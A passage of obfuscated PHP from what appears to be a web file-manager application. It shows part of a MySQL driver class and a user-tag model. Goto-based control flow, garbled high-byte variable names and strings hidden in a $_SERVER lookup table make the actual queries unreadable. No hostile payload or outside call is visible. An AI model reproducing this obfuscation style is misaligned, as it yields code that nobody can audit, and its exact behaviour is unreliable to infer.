$this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto cÖ™ßä˜”‰; eù“ãÓĞ¹ì: $Eî‚ÜâÕĞµ =& $_SERVER[´¬]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto eÕïçŞæÄ; aá‹¶ªšÜÍ: think_status($Eî‚ÜâÕĞµ[20]); $b×”ğäĞò† = mysql_query($cáçíÀîÂÎ, $this->_linkID); $this->debug(); goto c°Ã’¡ï­; cÖ™ßä˜”‰: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[´¬][855], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $DÇ‡Ç¾æÙ¶ = mysql_query($_SERVER[´¬][856], $this->_linkID); $this->transTimes = 0; if (!$DÇ‡Ç¾æÙ¶) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $f¼¿İ«ÔÆ˜ = mysql_query($_SERVER[´¬][857], $this->_linkID); $this->transTimes = 0; if (!$f¼¿İ«ÔÆ˜) { $this->error(); return !1; } } return !0; } private function getAll() { $AÀ‹øçˆ¤à = array(); if ($this->numRows > 0) { while ($f±´í„“ÕÖ = mysql_fetch_assoc($this->queryID)) { $AÀ‹øçˆ¤à[] = $f±´í„“ÕÖ; } mysql_data_seek($this->queryID, 0); } return $AÀ‹øçˆ¤à; } public function getFields($A™êŞµ†âä) { $A²ê×Ğ‰š =& $_SERVER[´¬]; $DªÂ¡ ê©† = $this->query($A²ê×Ğ‰š[858] . $this->parseKey($A™êŞµ†âä)); $F…Ø¿ã´¾ = array(); if ($DªÂ¡ ê©†) { foreach ($DªÂ¡ ê©† as $BË¤»—Ê => $Bã‚Å²Ú) { $F…Ø¿ã´¾[$Bã‚Å²Ú[$A²ê×Ğ‰š[27]]] = array($A²ê×Ğ‰š[28] => $Bã‚Å²Ú[$A²ê×Ğ‰š[27]], $A²ê×Ğ‰š[29] => $Bã‚Å²Ú[$A²ê×Ğ‰š[30]], $A²ê×Ğ‰š[31] => (bool) (strtoupper($Bã‚Å²Ú[$A²ê×Ğ‰š[32]]) === $A²ê×Ğ‰š[859]), $A²ê×Ğ‰š[34] => $Bã‚Å²Ú[$A²ê×Ğ‰š[35]], $A²ê×Ğ‰š[36] => strtolower($Bã‚Å²Ú[$A²ê×Ğ‰š[37]]) == $A²ê×Ğ‰š[38], $A²ê×Ğ‰š[39] => strtolower($Bã‚Å²Ú[$A²ê×Ğ‰š[40]]) == $A²ê×Ğ‰š[41]); } } return $F…Ø¿ã´¾; } public function getTables($eÁƒ‘†¬áÛ = '') { $cŸ‡· ªŞ¶ =& $_SERVER[´¬]; if (!empty($eÁƒ‘†¬áÛ)) { $FŸô›é¹¼ = $cŸ‡· ªŞ¶[860] . $eÁƒ‘†¬áÛ . $cŸ‡· ªŞ¶[861]; } else { $FŸô›é¹¼ = $cŸ‡· ªŞ¶[862]; } $aĞ¹»±Çè = $this->query($FŸô›é¹¼); $D¬œëÒŒ¶ = array(); foreach ($aĞ¹»±Çè as $d¨Úğ‚åóƒ => $cŒˆ–ëî«Ù) { $D¬œëÒŒ¶[$d¨Úğ‚åóƒ] = current($cŒˆ–ëî«Ù); } return $D¬œëÒŒ¶; } public function replace($E¸ÑÏ…‰Ñ¥, $A÷åçÌ£ª = array()) { $EÛƒ „Ãæ‹ =& $_SERVER[´¬]; foreach ($E¸ÑÏ…‰Ñ¥ as $Bé‘¤àÓŞº => $e¸Ê‚ÃŠò) { $eÙôå‹  = $this->parseValue($e¸Ê‚ÃŠò); if (is_scalar($eÙôå‹ )) { $Dæ ­ùÂŞ•[] = $eÙôå‹ ; $bóà©„®é˜[] = $this->parseKey($Bé‘¤àÓŞº); } } $f›ì˜ÏèÎñ = $EÛƒ „Ãæ‹[863] . $this->parseTable($A÷åçÌ£ª[$EÛƒ „Ãæ‹[276]]) . $EÛƒ „Ãæ‹[864] . implode($EÛƒ „Ãæ‹[47], $bóà©„®é˜) . $EÛƒ „Ãæ‹[865] . implode($EÛƒ „Ãæ‹[47], $Dæ ­ùÂŞ•) . $EÛƒ „Ãæ‹[866]; return $this->execute($f›ì˜ÏèÎñ); } public function insertAll($EÂËå¾ì„â, $Cñ‘Óá‡Äï = array(), $Eí¼àÎñ¢† = false) { goto f´ÒÄİ‚Ë×; bÎ®¦¾à‘: $bõ—“ê–Ò = array(); foreach ($EÂËå¾ì„â as $b±ÄËÓí³ô) { $eµèêÊ‚Ğ„ = array(); foreach ($b±ÄËÓí³ô as $B²Ä‡çØ– => $c¼Œœœà§) { $c¼Œœœà§ = $this->parseValue($c¼Œœœà§); if (is_scalar($c¼Œœœà§)) { $eµèêÊ‚Ğ„[] = $c¼Œœœà§; } } $bõ—“ê–Ò[] = $Cë¦…‚Îñô[257] . implode($Cë¦…‚Îñô[47], $eµèêÊ‚Ğ„) . $Cë¦…‚Îñô[866]; } array_walk($f…ó¸¢ÊÎ, array($this, $Cë¦…‚Îñô[867])); goto B£ØÎ¾×§¼; f´ÒÄİ‚Ë×: $Cë¦…‚Îñô =& $_SERVER[´¬]; if (!is_array($EÂËå¾ì„â[0])) { return !1; } $f…ó¸¢ÊÎ = array_keys($EÂËå¾ì„â[0]); goto bÎ®¦¾à‘; B£ØÎ¾×§¼: $e»ùÚÇŸÀŠ = ($Eí¼àÎñ¢† ? $Cë¦…‚Îñô[868] : $Cë¦…‚Îñô[869]) . $Cë¦…‚Îñô[870] . $this->parseTable($Cñ‘Óá‡Äï[$Cë¦…‚Îñô[276]]) . $Cë¦…‚Îñô[864] . implode($Cë¦…‚Îñô[47], $f…ó¸¢ÊÎ) . $Cë¦…‚Îñô[871] . implode($Cë¦…‚Îñô[47], $bõ—“ê–Ò); return $this->execute($e»ùÚÇŸÀŠ); goto A”÷ñ•ÖÅ; A”÷ñ•ÖÅ: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $F§¡Ñ–ÔÃ¼ =& $_SERVER[´¬]; $this->error = mysql_errno() . $F§¡Ñ–ÔÃ¼[4] . mysql_error($this->_linkID); if ($F§¡Ñ–ÔÃ¼[33] != $this->queryStr) { $this->error .= LNG($F§¡Ñ–ÔÃ¼[45]) . $this->queryStr; } think_trace($this->error, $F§¡Ñ–ÔÃ¼[33], $F§¡Ñ–ÔÃ¼[46]); return $this->error; } public function escapeString($b¸‰Èª”ö™) { if ($this->_linkID) { return mysql_real_escape_string($b¸‰Èª”ö™, $this->_linkID); } else { return mysql_escape_string($b¸‰Èª”ö™); } } public function parseKey(&$A¼å³·î—ñ, $fàÔ†œ°™ = true) { $Bòİä©Ã¸ª =& $_SERVER[´¬]; if ($fàÔ†œ°™) { $A¼å³·î—ñ = $this->parseKeyCheck($A¼å³·î—ñ); } if ($A¼å³·î—ñ != $Bòİä©Ã¸ª[182] && !preg_match($Bòİä©Ã¸ª[872], $A¼å³·î—ñ)) { $A¼å³·î—ñ = $Bòİä©Ã¸ª[381] . trim($A¼å³·î—ñ, $Bòİä©Ã¸ª[381]) . $Bòİä©Ã¸ª[381]; } return $A¼å³·î—ñ; } } goto DïÎƒù›Œ¶; F¯òÃ´•›ì: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\x73\x65\162\x5f\x66\x61\166"; protected function cacheFunctionAlias($C¡ØÕÓñ‡) { $C›¿“Öšã =& $_SERVER[´¬]; return array($C›¿“Öšã[1791] => array(USER_ID, $C›¿“Öšã[1792])); } protected function listData() { $f»šÀ›¿ó =& $_SERVER[´¬]; $Aöå²¾ÑÜ = array($f»šÀ›¿ó[1518] => USER_ID, $f»šÀ›¿ó[461] => array($f»šÀ›¿ó[1795], 0)); $eñæ”Ğß‚£ = $f»šÀ›¿ó[1797]; $DëÚğŒÖÍ = $this->field($eñæ”Ğß‚£)->where($Aöå²¾ÑÜ)->order($f»šÀ›¿ó[1798])->select(); return $DëÚğŒÖÍ ? $DëÚğŒÖÍ : array(); } protected function listByTag($aŠ™˜‰öœ) { } protected function addToTag($Eà“²‰©, $c©Á•†Ù½À) { $Aô»ïæƒ  =& $_SERVER[´¬]; if (!Model($Aô»ïæƒ [1933])->listData($c©Á•†Ù½À) || !Model($Aô»ïæƒ [790])->pathInfo($Eà“²‰©)) { return !1; } $b›Å÷æ³¼ = array($Aô»ïæƒ [1518] => USER_ID, $Aô»ïæƒ [461] => $c©Á•†Ù½À, $Aô»ïæƒ [412] => $Eà“²‰©, $Aô»ïæƒ [413] => $Aô»ïæƒ [407], $Aô»ïæƒ [411] => $Aô»ïæƒ [33], $Aô»ïæƒ [1693] => 0); if ($this->where($b›Å÷æ³¼)->find()) { return !1; } return $this->add($b›Å÷æ³¼); } protected function removeFromTag($C±ñ¸‰Ã¥, $F‘ºˆ›ò†”) { $bôêÁìß§¦ =& $_SERVER[´¬]; if (!Model($bôêÁìß§¦[1933])->listData($F‘ºˆ›ò†”)) { return !1; } if (is_array($C±ñ¸‰Ã¥)) { $C±ñ¸‰Ã¥ = array($bôêÁìß§¦[7], $C±ñ¸‰Ã¥); } $dÃ©†Ãøêî = array($bôêÁìß§¦[1518] => USER_ID, $bôêÁìß§¦[461] => $F‘ºˆ›ò†”, $bôêÁìß§¦[413] => $bôêÁìß§¦[407], $bôêÁìß§¦[412] => $C±ñ¸‰Ã¥); return $this->where($dÃ©†Ãøêî)->delete(); } protected function removeByTag($a‹¯ó½§Àß) { $eî¥‡Ëµ‰ =& $_SERVER[´¬]; if (!$a‹¯ó½§Àß) { return !1; } $BÆ­ê¢¸õí = array($eî¥‡Ëµ‰[1518] => USER_ID, $eî¥‡Ëµ‰[461] => $a‹¯ó½§Àß); return $this->where($BÆ­ê¢¸õí)->delete(); } protected function removeBySource($CâÃ×Õˆö) { $C¶Äš…©» =& $_SERVER[´¬]; if (is_array($CâÃ×Õˆö)) { $CâÃ×Õˆö = array($C¶Äš…©»[7], $CâÃ×Õˆö); } $cÓ›á‰Ş˜¨ = array($C¶Äš…©»[1518] => USER_ID, $C¶Äš…©»[412] => $CâÃ×Õˆö, $C¶Äš…©»[461] => array($C¶Äš…©»[972], 0)); return $this->where($cÓ›á‰Ş˜¨)->delete(); } }